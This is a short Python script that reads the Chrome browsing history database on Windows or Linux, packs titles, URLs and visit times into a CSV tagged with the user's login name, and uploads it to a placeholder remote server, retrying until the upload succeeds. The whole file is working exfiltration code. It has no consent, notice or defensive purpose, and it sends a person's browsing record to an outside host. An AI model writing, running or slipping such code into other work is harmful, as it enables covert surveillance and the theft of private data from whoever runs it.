import os
import platform
import sqlite3
import csv
import io
import requests
from datetime import datetime
from time import sleep

def get_user_path():
    return os.path.expanduser("~")

def get_chrome_history_path():
    system = platform.system()
    if system == "Windows":
        return os.path.join(get_user_path(), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
    elif system == "Linux":
        return os.path.join(get_user_path(), ".config", "google-chrome", "Default", "History")
    else:
        raise NotImplementedError("Operating system not supported")

def export_chrome_history(history_path):
    try:
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        chrome_history = cursor.fetchall()
        connection.close()

        username = os.getlogin()  # Get the current username
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")  # Get current timestamp
        file_name = f"{username}_{timestamp}_history.csv"

        csv_data = io.StringIO()
        csv_writer = csv.writer(csv_data)
        csv_writer.writerow(["Title", "URL", "Last Visit Time"])
        csv_writer.writerows(chrome_history)

        return csv_data.getvalue(), file_name

    except sqlite3.OperationalError as e:
        print("Error accessing Chrome history: ", e)

def send_csv_to_server(url, csv_data, file_name):
    files = {"file": (file_name, csv_data)}
    response = requests.post(url, files=files)
    return response

def main():
    user_path = get_user_path()
    history_path = get_chrome_history_path()

    retry_interval = 5  # Retry interval in seconds
    while True:
        try:
            csv_data, file_name = export_chrome_history(history_path)

            url = "http://REMOTE_SERVER_PUBLIC_IP:8000/upload"  # Replace REMOTE_SERVER_PUBLIC_IP with the public IP address or domain name of the server
            response = send_csv_to_server(url, csv_data, file_name)
            print("Response from server:", response.text)
            break  # Break the loop if upload is successful

        except Exception as e:
            print(f"Error occurred: {e}")
            print(f"Retrying in {retry_interval} seconds...")
            sleep(retry_interval)

if __name__ == "__main__":
    main()